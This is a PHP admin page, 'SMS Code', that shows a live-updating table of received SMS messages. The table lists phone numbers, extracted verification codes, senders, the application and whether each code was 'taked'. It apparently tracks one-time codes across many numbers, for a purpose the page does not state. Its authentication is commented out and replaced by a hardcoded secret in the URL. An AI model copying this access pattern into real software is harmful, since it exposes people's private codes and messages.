<?php
// require_once "validate_token.php";
// if (!checkTokenInDatabase()) {
//     header('Location: index.php');
//     exit(); 
// }
if (!isset($_GET['code'])) {
    die();
}
if ($_GET['code'] != "azxsdcfrevgtrrd4fg3") {
    die();
}

?>

<!DOCTYPE html>
<html>

<head>
<style>
        ul {
            list-style-type: none;
            padding: 0;
        }
        li {
            display: inline;
            margin-right: 20px;
        }
    </style>

    <title>SMS Code</title>
    <link rel="stylesheet" href="./css/fontawesome-all.min.css">
    <!-- Theme style -->
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.0.1/css/bootstrap.min.css">

    <link rel="stylesheet" href="./css/adminlte.min.css">
    <!-- include the Bootstrap and DataTables libraries -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/dt-1.10.22/datatables.min.css" />

    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/v/dt/dt-1.10.22/datatables.min.css" />
    <!-- <script type="text/javascript" src="https://cdn.datatables.net/v/dt/dt-1.10.22/datatables.min.js"></script> -->

</head>

<body class="hold-transition sidebar-mini" ng-app="countryapp" ng-controller="CountryController">
    <div class="wrapper">
        <?php include "menu.php"; ?>


        <div class="content-wrapper">
       

<h2>Search Manual</h2>

<ul>
<li><strong>p:</strong> Search by phone number</li>
<li><strong>t:</strong> Search by taked</li>
<li><strong>s:</strong> Search by sms</li>
<li><strong>a:</strong> Search by application</li>
<li><strong>no key </strong> Search In all</li>
</ul>

            <section class="content">
                <h2>
                <div class="container">
  <div class="row">
    <div class="col-md-6">
    <p>Total Records: <span id="totalRecords"></span></p>

    </div>
    <div class="col-md-6">
    <p>Total taked: <span id="total_taked"></span></p> 
    </div>
  </div>
</div>
</h2>

                <div class="container mt-5">
                    <table id="table_id" class="table table-striped table-info">

                        <thead>
                            <tr>
                                <th>id</th>
                                <th>phone_number</th>
                                <th>timestamp</th>
                                <th>sms</th>
                                <th>code</th>
                                <th>Sender_n</th>
                                <th>taked</th>
                                <th>Application</th>

                            </tr>
                        </thead>
                        <tfoot>
                            <tr>
                                <th>id</th>
                                <th>phone_number</th>
                                <th>timestamp</th>
                                <th>sms</th>
                                <th>code</th>
                                <th>Sender_n</th>
                                <th>taked</th>
                                <th>Application</th>
                            </tr>
                        </tfoot>



                    </table>
                </div>

            </section>
            <!-- /.control-sidebar -->
        </div>

        <footer class="main-footer">
            <div class="float-right d-none d-sm-block">
                <b>Version</b> 1.2.0
            </div>
            <strong>Copyright &copy; 2015-2023 <a href="#">ProDev.io</a>.</strong> All rights reserved.
        </footer>
    </div>
    <!-- ./wrapper -->
    <!-- /.content -->

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="./js/bootstrap.bundle.min.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular-resource.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular-sanitize.js"></script>
    <script src="./js/angular-file-saver.bundle.min.js"></script>
    <script src="./js/adminlte.min.js"></script>
    <!-- <script src="./FileSaver.js"></script> -->
    <script src="https://cdn.datatables.net/1.10.21/js/jquery.dataTables.min.js"></script>


    <script>
        $(document).ready(function() {
            var dataTable =    $('#table_id').DataTable({
                processing: true,
                serverSide: true,
                pageLength: 20,
                "order": [
                    [0, "desc"]
                ],
                "info": true,
                "dom": '<"top"f><"top"lp>rt<"bottom"lp><"top"f><"clear">',
                ajax: {
            "url": "Chile_api.php",
            "dataSrc": function (json) {
                // Access the recordsTotal property
                $('#totalRecords').text(json.recordsTotal);
                $('#total_taked').text(json.recordsTotal_taked);
                return json.data;
            }
        }
                //ajax: 'Chile_api.php',
            });
            function refreshTable() {
        dataTable.ajax.reload(null, false); // Reload the table data without resetting the current page
    }

    // Refresh the table every 2 seconds
    setInterval(refreshTable, 2000);
        });
    </script>

</body>

</html>